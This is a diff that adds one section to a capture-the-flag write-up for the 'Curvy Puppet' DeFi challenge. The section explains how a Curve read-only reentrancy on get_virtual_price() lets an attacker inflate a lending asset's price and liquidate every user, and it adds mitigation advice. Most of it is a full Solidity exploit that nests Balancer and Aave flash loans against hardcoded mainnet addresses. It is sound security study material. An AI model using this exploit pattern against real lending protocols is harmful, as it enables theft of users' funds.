@@ -528,3 +528,123 @@ by tinamints
     }
 }`
 
+
+
+## 17. Curvy Puppet
+### conditions :
+- close all 3 users' positions (alice/bob/charlie) in the lending contract (collateral + borrow both 0)
+- treasury must keep some WETH and some LP, and end with all 3 users' DVT (7500)
+- player must end with nothing
+### concepts :
+-  read-only reentrancy (Curve `get_virtual_price()`)
+-  price-oracle manipulation of a borrow asset
+-  nested flash loans (Balancer + Aave)
+### solution :
+- The lending contract prices its borrow asset (Curve stETH/ETH LP token) as `ETH_price * get_virtual_price()`. The old Curve pool's `remove_liquidity` burns LP supply first, then raw-calls the caller with ETH **before** the pool balances settle, so `get_virtual_price()` reads an inflated value during that ETH callback (read-only reentrancy). Because the LP token is the users' *borrow* asset, an inflated LP price inflates everyone's debt value, flipping the 3 overcollateralized positions to liquidatable.
+- Liquidation triggers when `collateralValue*100 < borrowValue*175`. With collateral = 2500 DVT @ $10 and borrow = 1 LP, this needs `virtual_price > 3.5714e18` (baseline is ~1.1e18). (in /CurvyPuppetLending.sol)
+- Flow: flash-loan WETH+wstETH from Balancer (outer, 0 fee) and Aave (inner) → unwrap/withdraw into ETH+stETH → `add_liquidity` a huge, deliberately stETH-heavy deposit (the spike scales with the stETH side) → `remove_liquidity` → inside the ETH `receive()` the virtual_price is spiked, so `liquidate()` all 3 users (paying 1 LP each from the treasury's 6.5 LP, receiving 2500 DVT each).
+- Repay: the ETH-poor deposit returns ETH-heavy / stETH-light, leaving an ETH surplus and a wstETH deficit of ~equal value; set aside the WETH owed, convert the remaining ETH to stETH via Lido (keeping a small reserve so the treasury keeps WETH), wrap to cover all wstETH owed. Aave's ~0.05% premium is the main cost, absorbed by the treasury's 200 WETH cushion, so the wstETH loan is kept modest.
+### mitigation :
+- Never read `get_virtual_price()` (or any pool state) while control can be handed to an untrusted caller — use a manipulation-resistant oracle, or guard views with the pool's reentrancy lock (Curve later added `remove_liquidity` reentrancy protection). Don't price a lending asset off a single spot virtual price.
+### POC
+` function test_curvyPuppet() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(
+            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
+        );
+        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
+        exploit.run();
+    }`
+
+`contract Exploit {
+    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
+    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+
+    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
+    uint256 constant BAL_WETH   = 37_000e18;
+    uint256 constant BAL_WSTETH = 12_000e18;
+    // stETH-heavy: sized to push virtual_price just past ~3.5714e18 (liquidation threshold)
+    uint256 constant AAVE_WETH   = 83_000e18;
+    uint256 constant AAVE_WSTETH = 140_000e18;
+    uint256 constant ETH_RESERVE = 20e18; // ETH kept so treasury ends with WETH > 0
+
+    // ... immutables + constructor storing lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users
+    enum State { NONE, LIQUIDATING }
+    State state;
+
+    function run() external {
+        // OUTER loan: Balancer (tokens sorted ascending: wstETH < WETH)
+        address[] memory tokens = new address[](2);
+        uint256[] memory amounts = new uint256[](2);
+        tokens[0] = address(wstETH); tokens[1] = address(weth);
+        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
+        balancer.flashLoan(address(this), tokens, amounts, "");
+
+        // everything ends up with the treasury
+        weth.deposit{value: address(this).balance}();
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
+        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
+        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
+    }
+
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
+        require(msg.sender == address(balancer), "not balancer");
+        // INNER loan: Aave (both assets), [0,0] modes = repay in full
+        address[] memory assets = new address[](2);
+        uint256[] memory amts = new uint256[](2);
+        uint256[] memory modes = new uint256[](2);
+        assets[0] = address(weth);  assets[1] = address(wstETH);
+        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
+        (bool ok,) = aavePool.call(abi.encodeWithSignature(
+            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
+            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
+        require(ok, "aave flashloan failed");
+        // repay Balancer (no fee)
+        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
+        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
+    }
+
+    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
+        address initiator, bytes calldata) external returns (bool) {
+        require(msg.sender == aavePool && initiator == address(this));
+        // 1) all borrowed tokens -> pool coins (ETH + stETH)
+        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
+        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
+        stETH.approve(address(curvePool), type(uint256).max);
+        // 2) add huge (stETH-heavy) liquidity
+        uint256 stEthAmount = stETH.balanceOf(address(this));
+        uint256 ethForLp = address(this).balance;
+        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
+        // 3) let lending pull our LP during liquidate()
+        IERC20(lpToken).approve(address(permit2), type(uint256).max);
+        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
+        // 4) remove -> pool raw-calls receive() with ETH -> liquidate window
+        state = State.LIQUIDATING;
+        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
+        state = State.NONE;
+        // 5) repay: ETH surplus -> stETH -> wstETH to cover the wstETH deficit
+        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
+        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
+        weth.deposit{value: wethOwed}();
+        uint256 ethBal = address(this).balance;
+        if (ethBal > ETH_RESERVE) {
+            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
+                abi.encodeWithSignature("submit(address)", address(0)));
+            require(ok, "lido submit failed");
+        }
+        stETH.approve(address(wstETH), type(uint256).max);
+        wstETH.wrap(stETH.balanceOf(address(this)));
+        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
+        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
+        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
+        return true;
+    }
+
+    receive() external payable {
+        if (state != State.LIQUIDATING) return;
+        // virtual_price is inflated now (read-only reentrancy) -> all positions liquidatable
+        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
+    }
+}`
